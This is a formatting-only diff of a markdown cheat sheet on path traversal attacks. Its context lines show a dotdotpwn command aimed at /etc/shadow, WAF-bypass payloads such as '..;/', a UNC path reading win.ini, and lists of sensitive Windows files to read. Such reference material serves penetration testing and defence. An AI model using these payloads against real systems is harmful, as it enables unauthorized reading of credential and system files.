@@ -6,20 +6,21 @@
 
 * [Tools](#tools)
 * [Basic exploitation](#basic-exploitation)
-    * [16 bits Unicode encoding](#16-bits-unicode-encoding)
-    * [UTF-8 Unicode encoding](#utf-8-unicode-encoding)
-    * [Bypass "../" replaced by ""](#bypass--replaced-by-)
-    * [Bypass "../" with ";"](#bypass--with-)
-    * [Double URL encoding](#double-url-encoding)
-    * [UNC Bypass](#unc-bypass)
+  * [16 bits Unicode encoding](#16-bits-unicode-encoding)
+  * [UTF-8 Unicode encoding](#utf-8-unicode-encoding)
+  * [Bypass "../" replaced by ""](#bypass--replaced-by-)
+  * [Bypass "../" with ";"](#bypass--with-)
+  * [Double URL encoding](#double-url-encoding)
+  * [UNC Bypass](#unc-bypass)
 * [Path Traversal](#path-traversal)
-    * [Interesting Linux files](#interesting-linux-files)
-    * [Interesting Windows files](#interesting-windows-files)
+  * [Interesting Linux files](#interesting-linux-files)
+  * [Interesting Windows files](#interesting-windows-files)
 * [References](#references)
 
 ## Tools
 
 - [dotdotpwn - https://github.com/wireghoul/dotdotpwn](https://github.com/wireghoul/dotdotpwn)
+
     ```powershell
     git clone https://github.com/wireghoul/dotdotpwn
     perl dotdotpwn.pl -h 10.10.10.10 -m ftp -t 300 -f /etc/shadow -s -q -b
@@ -57,6 +58,7 @@ We can use the `..` characters to access the parent directory, the following str
 ```
 
 ### Bypass "../" replaced by ""
+
 Sometimes you encounter a WAF which remove the "../" characters from the strings, just duplicate them.
 
 ```powershell
@@ -68,7 +70,7 @@ Sometimes you encounter a WAF which remove the "../" characters from the strings
 
 ```powershell
 ..;/
-http://domain.tld/page.jsp?include=..;/..;/sensitive.txt 
+http://domain.tld/page.jsp?include=..;/..;/sensitive.txt
 ```
 
 ### Double URL encoding
@@ -88,7 +90,6 @@ An attacker can inject a Windows UNC share ('\\UNC\share\name') into a software 
 ```powershell
 \\localhost\c$\windows\win.ini
 ```
-
 
 ## Path Traversal
 
@@ -123,7 +124,7 @@ An attacker can inject a Windows UNC share ('\\UNC\share\name') into a software 
 
 ### Interesting Windows files
 
-Always existing file in recent Windows machine. 
+Always existing file in recent Windows machine.
 Ideal to test path traversal but nothing much interesting inside...
 
 ```powershell
@@ -131,7 +132,7 @@ c:\windows\system32\license.rtf
 c:\windows\system32\eula.txt
 ```
 
-Interesting files to check out (Extracted from https://github.com/soffensive/windowsblindread)
+Interesting files to check out (Extracted from <https://github.com/soffensive/windowsblindread>)
 
 ```powershell
 c:/boot.ini
